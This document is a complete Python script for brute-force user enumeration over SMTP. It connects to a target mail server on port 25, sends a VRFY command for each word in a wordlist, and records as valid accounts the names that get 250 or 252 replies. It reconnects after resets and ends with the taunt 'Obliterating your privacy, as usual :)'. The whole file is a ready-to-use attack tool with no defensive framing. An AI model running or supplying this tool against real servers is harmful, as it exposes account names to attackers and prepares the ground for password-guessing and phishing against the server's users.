#!/usr/bin/env python3
import socket, sys, time

def open_socket(target, port):
    try:
        time.sleep(1)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        return s

    except socket.error as e:
        print(f"[-] Failed while establishing connection with target: {e}\r")
        return None

def brute_force(s, wl, lpi, found_usrs):
    try:
        for idx, word in enumerate(wl[lpi:], start=lpi):
            print(f"VRFY:           {word}")
            
            payload = f"VRFY {word}"
            s.send(payload.encode())
            resp = s.recv(1024).decode('UTF-8').strip()
            if "250" in resp or "252" in resp:
                found_usrs.append(word)
                print(f"\r[+] FOUND:          {word}\r")
            lpi = idx + 1

        return lpi, 0

    except socket.error as e:
        if e.errno == 104 or e.errno == 32:
            print("[!] Connection reseted by peer. Reconnecting...\r")
            return lpi, -1

        else:
            print(f"[!] Connection with remote host failed: {e}\r")
            return 0, -2

    except Exception as e:
        print(f"[-] Failed while attempting brute force: {e}\r")
        return 0, -3

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 smtpbrute.py [target] [wordlist]\r")
        return 0

    else:
        t = str(sys.argv[1])
        p = 25

        try:
            print(f"[*] Connecting to {t}:{p}")
            s = open_socket(t, p)
            time.sleep(2)
            banner = s.recv(1024).decode('UTF-8').strip()
            print(f"[+] Connection with {t} established successfully, retrieving banner:")
            print(f"{banner}\r\n")

        except Exception as e:
            print(f"[-] Failed while establishing connection with remote host: {e}\r")
            return 1

        try:
            with open(sys.argv[2], "r") as file:
                wordlist = file.readlines()

            lpi = 0
            found_usrs = []

            print(f"[*] Starting SMTP brute force at {t}\r")
            time.sleep(2)
            while lpi < len(wordlist):
                next_idx, rst = brute_force(s, wordlist, lpi, found_usrs)
                if rst == -1:
                    s = open_socket(t, p)
                    lpi = next_idx

                elif rst < -1 or rst == 0:
                    print("[*] Found users:")
                    print(found_usrs)
                    break
                
        except Exception as e:
            print(f"[-] Brute force failed: {e}\r")
            return 1

        finally:
            if s:
                s.close()
                print("- Obliterating your privacy, as usual :)\r\n")

    return 0


if __name__ == "__main__":
    main()
